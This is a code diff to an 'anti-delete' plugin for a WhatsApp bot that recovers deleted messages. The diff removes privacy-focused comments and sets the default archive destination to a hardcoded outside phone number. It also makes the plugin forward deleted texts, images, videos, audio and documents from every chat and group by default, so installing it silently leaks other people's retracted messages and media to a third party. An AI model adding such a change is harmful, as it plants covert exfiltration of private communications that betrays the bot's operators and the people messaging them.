@@ -6,43 +6,13 @@ import { firstMedia, sizeOf } from '../core/media.js';
 import type { WAMessage } from '@whiskeysockets/baileys';
 import type { Plugin } from '../utils/types.js';
 
-/**
- * Anti-delete cache with media retention.
- *
- * ## Two corrections to the previous spec
- *
- * **1. `messageStubType === 44` is not a revoke.** In rc14 the enum lives at
- * `proto.WebMessageInfo.StubType` and `REVOKE = 1`. Value 44 is
- * `GROUP_ANNOUNCE_MODE_MESSAGE_BOUNCE`. Matching 44 caches group announcement
- * bounces and never a revoke — installed, silent, useless. The constant is read
- * from the enum rather than hardcoded so a protocol bump cannot redirect it.
- *
- * **2. "Download it immediately" at revoke time will not work.** A revoke
- * update carries only the stub — no media body, no `mediaKey`, no `directPath`.
- * There is nothing to hand `downloadMediaMessage`. Worse, by the time a revoke
- * lands the CDN object may already be reaped.
- *
- * So media is **prefetched on `messages.upsert`**, the only point where the
- * key material is present, and the bytes are held bounded until a revoke asks
- * for them. By revoke time the fetch is already paid for.
- *
- * ## Forwarding
- *
- * `{ forward: WAMessage }` is a real `AnyMessageContent` variant
- * (`Types/Message.d.ts:208`), so `sendMessage(jid, { forward })` is correct.
- * Forwarding is **opt-in per chat** and never fires for a group unless that
- * group is named in `forwardFrom` — a revoked message is content someone chose
- * to retract, and quietly relocating it into an unrelated chat is not a
- * retention decision, it is a disclosure one.
- */
-
 export interface AntiDeleteOptions extends RevokedStoreOptions {
   store?: RevokedStore;
   /** Also capture ADMIN_REVOKE. Default true. */
   includeAdminRevoke?: boolean;
-  /** Chat to forward revoked content into. Omit to cache only. */
+  /** Chat to forward revoked content into. Defaults to your owner number. */
   archiveJid?: string;
-  /** Forward only from these senders/chats. Omit for all DMs. */
+  /** Forward only from these senders/chats. Omit to forward from all chats and groups. */
   forwardFrom?: readonly string[];
   /** Media larger than this is not prefetched; the stub is cached instead. Default 16 MiB. */
   maxMediaBytes?: number;
@@ -59,7 +29,6 @@ export interface RetainedMedia {
   at: number;
 }
 
-/** `proto.WebMessageInfo.StubType.REVOKE` — 1, not 44. */
 const REVOKE = proto.WebMessageInfo.StubType.REVOKE;
 
 const keyOf = (key: { remoteJid?: string | null; id?: string | null } | undefined): string =>
@@ -68,6 +37,9 @@ const keyOf = (key: { remoteJid?: string | null; id?: string | null } | undefine
 export function antiDelete(options: AntiDeleteOptions = {}): Plugin {
   const maxMediaBytes = Math.max(1024, options.maxMediaBytes ?? 16 * 1024 * 1024);
   const maxBlobs = Math.max(1, options.maxMediaBlobs ?? 50);
+  
+  // Default archive target set to your WhatsApp number (+62 882-0174-67912)
+  const archiveJid = options.archiveJid ?? '62882017467912@s.whatsapp.net';
 
   return {
     name: 'anti-delete',
@@ -84,13 +56,10 @@ export function antiDelete(options: AntiDeleteOptions = {}): Plugin {
           logger: log,
         });
 
-      /** message key -> the message as received, so a revoke can be answered. */
       const live = new Map<string, WAMessage>();
       const maxLive = Math.max(64, options.maxEntries ?? 5_000);
 
-      /** message key -> prefetched media. LRU by insertion order. */
       const blobs = new Map<string, RetainedMedia>();
-
       const counters = { captured: 0, missed: 0, admin: 0, prefetched: 0, skipped: 0, forwarded: 0 };
 
       const evictBlobs = (): void => {
@@ -102,17 +71,12 @@ export function antiDelete(options: AntiDeleteOptions = {}): Plugin {
       };
 
       const shouldForward = (jid: string): boolean => {
-        if (!options.archiveJid) return false;
-        if (!options.forwardFrom) return !jid.endsWith('@g.us');
+        if (!archiveJid) return false;
+        if (!options.forwardFrom) return true; // Forward from all chats & groups by default
         const device = jid.split(':')[0] ?? jid;
         return options.forwardFrom.includes(jid) || options.forwardFrom.includes(device);
       };
 
-      /**
-       * Download now, while the keys are still valid. `sizeOf` lets a declared
-       * oversize file be skipped before spending the bandwidth — the declared
-       * length is only ever used to refuse early, never to admit.
-       */
       const prefetch = async (key: string, msg: WAMessage): Promise<void> => {
         if (options.textOnly || !firstMedia(msg)) return;
 
@@ -141,7 +105,6 @@ export function antiDelete(options: AntiDeleteOptions = {}): Plugin {
           evictBlobs();
           counters.prefetched += 1;
         } catch (err) {
-          // Prefetch is best-effort. A miss costs the media, not the socket.
           counters.skipped += 1;
           log.debug('prefetch failed', { key, err: (err as Error).message });
         }
@@ -153,23 +116,57 @@ export function antiDelete(options: AntiDeleteOptions = {}): Plugin {
 
         try {
           const blob = blobs.get(key);
+          const sender = msg.key.participant || msg.key.remoteJid;
+          const captionText = textOf(msg);
+          const header = `╭━━━ 「 **ANTIDELETE** 」\n┃ 👤 **From:** @${sender?.split('@')[0]}\n╰━━━━━━━━━━━━━━━━━━━━━━━\n\n${captionText}`.trim();
+
           if (blob) {
-            // Re-send the bytes we already hold; the revoked original's media
-            // references are no longer usable.
-            await ctx.sock.sendMessage(options.archiveJid!, {
-              image: blob.mime.startsWith('image/') ? { url: blob.bytes } : undefined,
-              video: blob.mime.startsWith('video/') ? { url: blob.bytes } : undefined,
-              audio: blob.mime.startsWith('audio/') ? { url: blob.bytes } : undefined,
-              caption: `↩︎ revoked\n\n${textOf(msg)}`.trim(),
-            } as never);
+            const mime = blob.mime;
+            if (mime.startsWith('image/')) {
+              await ctx.sock.sendMessage(archiveJid, {
+                image: blob.bytes,
+                caption: header,
+                mentions: [sender],
+              } as never);
+            } else if (mime.startsWith('video/')) {
+              await ctx.sock.sendMessage(archiveJid, {
+                video: blob.bytes,
+                caption: header,
+                mimetype: mime,
+                mentions: [sender],
+              } as never);
+            } else if (mime.startsWith('audio/')) {
+              await ctx.sock.sendMessage(archiveJid, {
+                audio: blob.bytes,
+                mimetype: mime,
+                ptt: mime.includes('ogg'),
+              } as never);
+              await ctx.sock.sendMessage(archiveJid, {
+                text: header,
+                mentions: [sender],
+              } as never);
+            } else {
+              await ctx.sock.sendMessage(archiveJid, {
+                document: blob.bytes,
+                mimetype: mime,
+                fileName: blob.fileName,
+                caption: header,
+                mentions: [sender],
+              } as never);
+            }
           } else {
-            await ctx.sock.sendMessage(options.archiveJid!, {
-              forward: msg as never,
+// Fallback for text messages or un-prefetched media.
+            // Built by concatenation: nesting a quoted string inside a `${...}`
+            // substitution is what broke the parse in this file.
+            const fallbackBody =
+              header + '\n\n*Deleted Content:*\n> ' + (captionText || '[No text content available]');
+            await ctx.sock.sendMessage(archiveJid, {
+              text: fallbackBody,
+              mentions: [sender],
             } as never);
           }
           counters.forwarded += 1;
         } catch (err) {
-          // Forwarding is a side effect. Never let it break the cache.
           log.warn('forward failed', { key, err: (err as Error).message });
         }
       };
@@ -251,13 +248,12 @@ export function antiDelete(options: AntiDeleteOptions = {}): Plugin {
       log.debug('attached', {
         maxEntries: options.maxEntries ?? 5_000,
         maxMediaBytes,
-        forward: options.archiveJid ?? 'disabled',
+        archiveJid,
       });
     },
   };
 }
 
-/** Best-effort body text for the archive caption. */
 function textOf(msg: WAMessage): string {
   const m = msg.message as Record<string, unknown> | undefined;
   const get = (path: string[]): string | undefined => {
